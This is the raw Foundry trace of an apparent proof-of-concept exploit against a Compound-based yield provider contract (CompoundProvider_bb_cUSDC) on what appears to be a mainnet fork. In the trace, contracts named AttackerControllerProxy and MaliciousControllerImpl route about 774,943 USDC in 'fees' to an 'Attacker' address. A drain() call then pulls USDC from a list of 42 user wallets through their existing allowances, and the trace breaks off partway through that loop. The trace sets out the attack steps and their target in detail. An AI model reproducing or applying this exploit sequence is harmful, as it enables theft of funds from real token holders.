Compiling 23 files with Solc 0.8.34
Solc 0.8.34 finished in 505.52ms
Compiler run successful with warnings:
  --> basetest.sol:87:5:
87 |     modifier balanceLog() virtual {
    │   │   │   │   └─ ← [Return] 774782591502 [7.747e11]
    │   │   │   ├─ [16149] USDC::transferFrom(0x1Dd01835E0Eb26ABe597e2e69FfAC1A6cd00283A, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 160787907 [1.607e8])
    │   │   │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0x1Dd01835E0Eb26ABe597e2e69FfAC1A6cd00283A, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 160787907 [1.607e8]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0x1Dd01835E0Eb26ABe597e2e69FfAC1A6cd00283A, to: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], value: 160787907 [1.607e8])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 774943379409 [7.749e11]
    │   │   │   │   └─ ← [Return] 774943379409 [7.749e11]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [191778] CompoundProvider_bb_cUSDC::transferFees()
    │   │   │   ├─ [539] AttackerControllerProxy::_beforeCTokenBalanceChange()
    │   │   │   │   ├─ [143] MaliciousControllerImpl::_beforeCTokenBalanceChange() [delegatecall]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ [150236] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::redeemUnderlying(0)
    │   │   │   │   ├─ [3339] USDC::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [staticcall]
    │   │   │   │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   ├─ [7853] 0xD8EC56013EA119E7181d231E5048f90fBbe753c0::getBorrowRate(2762901122770 [2.762e12], 5313368470651 [5.313e12], 129027399001 [1.29e11]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b3bce6ba
    │   │   │   │   ├─ emit AccrueInterest(: 3379388 [3.379e6], : 1678993609866502354 [1.678e18], : 5313371850039 [5.313e12])
    │   │   │   │   ├─ [1339] USDC::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [staticcall]
    │   │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   ├─ [74907] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::redeemAllowed(0x39AA39c021dfbaE8faC545936693aC917d5E7563, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 0)
    │   │   │   │   │   ├─ [74217] 0xBafE01ff935C7305907c33BF824352eE5979B526::redeemAllowed(0x39AA39c021dfbaE8faC545936693aC917d5E7563, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 0) [delegatecall]
    │   │   │   │   │   │   ├─ [8556] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::getAccountSnapshot(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   │   │   │   ├─ [1339] USDC::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [staticcall]
    │   │   │   │   │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [delegatecall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002c94203484ba700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e6506ebd8256
    │   │   │   │   │   │   ├─ [26307] 0x8CF42B08AD13761345531b839487aA4d113955d9::getUnderlyingPrice(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [staticcall]
    │   │   │   │   │   │   │   ├─ [5615] 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6::decimals() [staticcall]
    │   │   │   │   │   │   │   │   ├─ [273] 0xc9E1a09622afdB659913fefE800fEaE5DBbFe9d7::decimals() [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
    │   │   │   │   │   │   │   │   └─ ← [Return] 8
    │   │   │   │   │   │   │   ├─ [11142] 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   ├─ [7409] 0xc9E1a09622afdB659913fefE800fEaE5DBbFe9d7::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000042c0000000000000000000000000000000000000000000000000000000005f576d3000000000000000000000000000000000000000000000000000000006a55ec8f000000000000000000000000000000000000000000000000000000006a55eca3000000000000000000000000000000000000000000000000000000000000042c
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000003000000000000042c0000000000000000000000000000000000000000000000000000000005f576d3000000000000000000000000000000000000000000000000000000006a55ec8f000000000000000000000000000000000000000000000000000000006a55eca3000000000000000000000000000000000000000000000003000000000000042c
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000c9e4bc6cea66a2a4a6ac00000
    │   │   │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 784235313515431 [7.842e14]
    │   │   │   │   │   │   ├─ emit DistributedSupplierComp(param0: 0x39AA39c021dfbaE8faC545936693aC917d5E7563, param1: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], param2: 0, param3: 77232613081136195923568085522837569385714 [7.723e40])
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [1339] USDC::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [staticcall]
    │   │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   ├─ [5452] USDC::transfer(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 0)
    │   │   │   │   │   ├─ [4663] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transfer(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 0) [delegatecall]
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x39AA39c021dfbaE8faC545936693aC917d5E7563, to: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], value: 0)
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ emit Transfer(from: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], to: 0x39AA39c021dfbaE8faC545936693aC917d5E7563, value: 0)
    │   │   │   │   ├─ emit Redeem(redeemer: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], redeemAmount: 0, redeemTokens: 0)
    │   │   │   │   ├─ [1004] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::redeemVerify(0x39AA39c021dfbaE8faC545936693aC917d5E7563, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 0, 0)
    │   │   │   │   │   ├─ [391] 0xBafE01ff935C7305907c33BF824352eE5979B526::redeemVerify(0x39AA39c021dfbaE8faC545936693aC917d5E7563, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 0, 0) [delegatecall]
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [844] AttackerControllerProxy::_afterCTokenBalanceChange(784235313515431 [7.842e14])
    │   │   │   │   ├─ [445] MaliciousControllerImpl::_afterCTokenBalanceChange(784235313515431 [7.842e14]) [delegatecall]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   └─ ← [Return] 784235313515431 [7.842e14]
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 774943379409 [7.749e11]
    │   │   │   │   └─ ← [Return] 774943379409 [7.749e11]
    │   │   │   ├─ [845] AttackerControllerProxy::feesOwner() [staticcall]
    │   │   │   │   ├─ [446] MaliciousControllerImpl::feesOwner() [delegatecall]
    │   │   │   │   │   └─ ← [Return] Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1]
    │   │   │   │   └─ ← [Return] Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1]
    │   │   │   ├─ [25352] USDC::transfer(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1], 774943379409 [7.749e11])
    │   │   │   │   ├─ [24563] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transfer(Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1], 774943379409 [7.749e11]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], to: Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1], value: 774943379409 [7.749e11])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit TransferFees(param0: AttackerControllerProxy: [0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580], param1: Attacker: [0xF908610E9174c7cd6e9dfD371e238be4511297A1], param2: 774943379409 [7.749e11])
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [1092963] AttackerControllerProxy::drain(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], [0xf7b782a255CA66a8bB7Ee7DC56f3E8F5dB069878, 0x7aC049b7D78bC930E463709eC5e77855A5DCA4C4, 0xcbC85eaa5432054Dd813E80399811Cd8EbB019f3, 0xf7463aD9dBF2d12eCF820574d1D7918b721E462a, 0x96234e93d9fb27fdA6414D89adeB963f126F4704, 0x279d1194C9766fE2101de5a832C865936912302B, 0x7bcD790D1282622dA859625F3786bE9F33042d50, 0x4Fc3bA996E1171f583D287D47a7F0a699c9b9a50, 0x48582Bb9Fddf1a9d6Cf8b8977cF438ad88ebbb2e, 0x65EA649801c01b758390F8c8E4ebeE81c9610721, 0x2F9677016cB1e92e8F8a999c4541650C80C8637A, 0xB5baA417Da97f9F99851e6f74144bB017DAB9D9a, 0xdB08660e865e8a65e6b3EeE746F24d1f7e48A69F, 0xeD5D4aA57E28689050Eb7DE9975D79E0B254F4A0, 0xD72708E95577F80056Fd6A44EC30d644B5A86486, 0x02745a825647C12b765263BA857C7038B637E661, 0x9Ee1830ff376758c5Ecc7FB465f3b14d64116d71, 0x40E652fE0EC7329DC80282a6dB8f03253046eFde, 0x760F55Ad4Ee58fF9bf39521d27ACBcc184294A9D, 0x2f8F29B975B276a545BC479019BC2a6C6CB287Fc, 0x8DC4310F20d59BA458b76A62141697717f93FA41, 0x55119a68D5e8a28A345475B2f33d4C92a619e60d, 0xe8787b5a359c30318D9b805651D18275f33Fa1Bd, 0xADd18f272F9fc3fE94471FB46bEe589A3Ee3aAF3, 0x7FC17120EB1CAd644E8dfd92f6B0972938Ca16e0, 0x143F19f07A7e115FdE31C9140059482DD4b92156, 0x201E6710f39611807BB8EC840f8c252F6C16C71E, 0xc0fe8F6523ccd1BEEA03C277B877aaAFA155a432, 0x4cDA2CE710f02CAc792D21Daef238C42ad20EFcB, 0xB6dD9ae003981CdcE9317a1712d656E4979C5217, 0x478f25e0856AA133F7F9f68F1DAb2505b6EF9Bd1, 0x8B3f14F0582FbF275BE87d265C931B4dfD5F13B7, 0x597880a850b323c6059D35FD4b59ce65C5E42E20, 0x0e537305A2485aBb46940f12bE5AA0BE9Aac4f50, 0x6E1bd418d2101bAF7Fb7f184Ef3B73a6662a8537, 0xa87Fb592b76236760Cd87092261Ab5e0723D189A, 0x1A9501F026B8Fb3654Fa995BF9d7Ca738E582295, 0xdB5e3FDCF2599bDdA10394d2416B26160BCFf3cB, 0x215C9B8A43B81112613b5c686f580E879a7B32cc, 0x6AFf321b5b9aD9C5564B54835fb9af27942AAa06, 0x19Ac2C2f5C300286a069ED5f1247A9544338a2CD, 0x7bA6Da6Da32AC61cC7B602B163F49EE80Fc42767], [154860342 [1.548e8], 151504399 [1.515e8], 110911220 [1.109e8], 101159792 [1.011e8], 99548767 [9.954e7], 90247381 [9.024e7], 88874490 [8.887e7], 82660000 [8.266e7], 78588865 [7.858e7], 60856930 [6.085e7], 55308103 [5.53e7], 50000000 [5e7], 49990001 [4.999e7], 47161227 [4.716e7], 45366488 [4.536e7], 38800789 [3.88e7], 37623964 [3.762e7], 32014883 [3.201e7], 29254385 [2.925e7], 28955444 [2.895e7], 25409071 [2.54e7], 22827244 [2.282e7], 20388242 [2.038e7], 15627825 [1.562e7], 14364741 [1.436e7], 13463919 [1.346e7], 13277339 [1.327e7], 13026155 [1.302e7], 8841187 [8.841e6], 8000000 [8e6], 7980797 [7.98e6], 7937226 [7.937e6], 6550000 [6.55e6], 5746960 [5.746e6], 4681764 [4.681e6], 2323868 [2.323e6], 2192169 [2.192e6], 1470035 [1.47e6], 1198656 [1.198e6], 1161350 [1.161e6], 1012506 [1.012e6], 1000000 [1e6]])
    │   ├─ [1092024] MaliciousControllerImpl::drain(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], [0xf7b782a255CA66a8bB7Ee7DC56f3E8F5dB069878, 0x7aC049b7D78bC930E463709eC5e77855A5DCA4C4, 0xcbC85eaa5432054Dd813E80399811Cd8EbB019f3, 0xf7463aD9dBF2d12eCF820574d1D7918b721E462a, 0x96234e93d9fb27fdA6414D89adeB963f126F4704, 0x279d1194C9766fE2101de5a832C865936912302B, 0x7bcD790D1282622dA859625F3786bE9F33042d50, 0x4Fc3bA996E1171f583D287D47a7F0a699c9b9a50, 0x48582Bb9Fddf1a9d6Cf8b8977cF438ad88ebbb2e, 0x65EA649801c01b758390F8c8E4ebeE81c9610721, 0x2F9677016cB1e92e8F8a999c4541650C80C8637A, 0xB5baA417Da97f9F99851e6f74144bB017DAB9D9a, 0xdB08660e865e8a65e6b3EeE746F24d1f7e48A69F, 0xeD5D4aA57E28689050Eb7DE9975D79E0B254F4A0, 0xD72708E95577F80056Fd6A44EC30d644B5A86486, 0x02745a825647C12b765263BA857C7038B637E661, 0x9Ee1830ff376758c5Ecc7FB465f3b14d64116d71, 0x40E652fE0EC7329DC80282a6dB8f03253046eFde, 0x760F55Ad4Ee58fF9bf39521d27ACBcc184294A9D, 0x2f8F29B975B276a545BC479019BC2a6C6CB287Fc, 0x8DC4310F20d59BA458b76A62141697717f93FA41, 0x55119a68D5e8a28A345475B2f33d4C92a619e60d, 0xe8787b5a359c30318D9b805651D18275f33Fa1Bd, 0xADd18f272F9fc3fE94471FB46bEe589A3Ee3aAF3, 0x7FC17120EB1CAd644E8dfd92f6B0972938Ca16e0, 0x143F19f07A7e115FdE31C9140059482DD4b92156, 0x201E6710f39611807BB8EC840f8c252F6C16C71E, 0xc0fe8F6523ccd1BEEA03C277B877aaAFA155a432, 0x4cDA2CE710f02CAc792D21Daef238C42ad20EFcB, 0xB6dD9ae003981CdcE9317a1712d656E4979C5217, 0x478f25e0856AA133F7F9f68F1DAb2505b6EF9Bd1, 0x8B3f14F0582FbF275BE87d265C931B4dfD5F13B7, 0x597880a850b323c6059D35FD4b59ce65C5E42E20, 0x0e537305A2485aBb46940f12bE5AA0BE9Aac4f50, 0x6E1bd418d2101bAF7Fb7f184Ef3B73a6662a8537, 0xa87Fb592b76236760Cd87092261Ab5e0723D189A, 0x1A9501F026B8Fb3654Fa995BF9d7Ca738E582295, 0xdB5e3FDCF2599bDdA10394d2416B26160BCFf3cB, 0x215C9B8A43B81112613b5c686f580E879a7B32cc, 0x6AFf321b5b9aD9C5564B54835fb9af27942AAa06, 0x19Ac2C2f5C300286a069ED5f1247A9544338a2CD, 0x7bA6Da6Da32AC61cC7B602B163F49EE80Fc42767], [154860342 [1.548e8], 151504399 [1.515e8], 110911220 [1.109e8], 101159792 [1.011e8], 99548767 [9.954e7], 90247381 [9.024e7], 88874490 [8.887e7], 82660000 [8.266e7], 78588865 [7.858e7], 60856930 [6.085e7], 55308103 [5.53e7], 50000000 [5e7], 49990001 [4.999e7], 47161227 [4.716e7], 45366488 [4.536e7], 38800789 [3.88e7], 37623964 [3.762e7], 32014883 [3.201e7], 29254385 [2.925e7], 28955444 [2.895e7], 25409071 [2.54e7], 22827244 [2.282e7], 20388242 [2.038e7], 15627825 [1.562e7], 14364741 [1.436e7], 13463919 [1.346e7], 13277339 [1.327e7], 13026155 [1.302e7], 8841187 [8.841e6], 8000000 [8e6], 7980797 [7.98e6], 7937226 [7.937e6], 6550000 [6.55e6], 5746960 [5.746e6], 4681764 [4.681e6], 2323868 [2.323e6], 2192169 [2.192e6], 1470035 [1.47e6], 1198656 [1.198e6], 1161350 [1.161e6], 1012506 [1.012e6], 1000000 [1e6]]) [delegatecall]
    │   │   ├─ [42419] CompoundProvider_bb_cUSDC::_takeUnderlying(0xf7b782a255CA66a8bB7Ee7DC56f3E8F5dB069878, 154860342 [1.548e8])
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [36049] USDC::transferFrom(0xf7b782a255CA66a8bB7Ee7DC56f3E8F5dB069878, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 154860342 [1.548e8])
    │   │   │   │   ├─ [35254] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0xf7b782a255CA66a8bB7Ee7DC56f3E8F5dB069878, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 154860342 [1.548e8]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0xf7b782a255CA66a8bB7Ee7DC56f3E8F5dB069878, to: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], value: 154860342 [1.548e8])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 154860342 [1.548e8]
    │   │   │   │   └─ ← [Return] 154860342 [1.548e8]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [22519] CompoundProvider_bb_cUSDC::_takeUnderlying(0x7aC049b7D78bC930E463709eC5e77855A5DCA4C4, 151504399 [1.515e8])
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 154860342 [1.548e8]
    │   │   │   │   └─ ← [Return] 154860342 [1.548e8]
    │   │   │   ├─ [16149] USDC::transferFrom(0x7aC049b7D78bC930E463709eC5e77855A5DCA4C4, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 151504399 [1.515e8])
    │   │   │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0x7aC049b7D78bC930E463709eC5e77855A5DCA4C4, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 151504399 [1.515e8]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0x7aC049b7D78bC930E463709eC5e77855A5DCA4C4, to: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], value: 151504399 [1.515e8])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 306364741 [3.063e8]
    │   │   │   │   └─ ← [Return] 306364741 [3.063e8]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [22519] CompoundProvider_bb_cUSDC::_takeUnderlying(0xcbC85eaa5432054Dd813E80399811Cd8EbB019f3, 110911220 [1.109e8])
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 306364741 [3.063e8]
    │   │   │   │   └─ ← [Return] 306364741 [3.063e8]
    │   │   │   ├─ [16149] USDC::transferFrom(0xcbC85eaa5432054Dd813E80399811Cd8EbB019f3, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 110911220 [1.109e8])
    │   │   │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0xcbC85eaa5432054Dd813E80399811Cd8EbB019f3, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 110911220 [1.109e8]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0xcbC85eaa5432054Dd813E80399811Cd8EbB019f3, to: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], value: 110911220 [1.109e8])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 417275961 [4.172e8]
    │   │   │   │   └─ ← [Return] 417275961 [4.172e8]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [22519] CompoundProvider_bb_cUSDC::_takeUnderlying(0xf7463aD9dBF2d12eCF820574d1D7918b721E462a, 101159792 [1.011e8])
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 417275961 [4.172e8]
    │   │   │   │   └─ ← [Return] 417275961 [4.172e8]
    │   │   │   ├─ [16149] USDC::transferFrom(0xf7463aD9dBF2d12eCF820574d1D7918b721E462a, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 101159792 [1.011e8])
    │   │   │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0xf7463aD9dBF2d12eCF820574d1D7918b721E462a, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 101159792 [1.011e8]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0xf7463aD9dBF2d12eCF820574d1D7918b721E462a, to: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], value: 101159792 [1.011e8])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
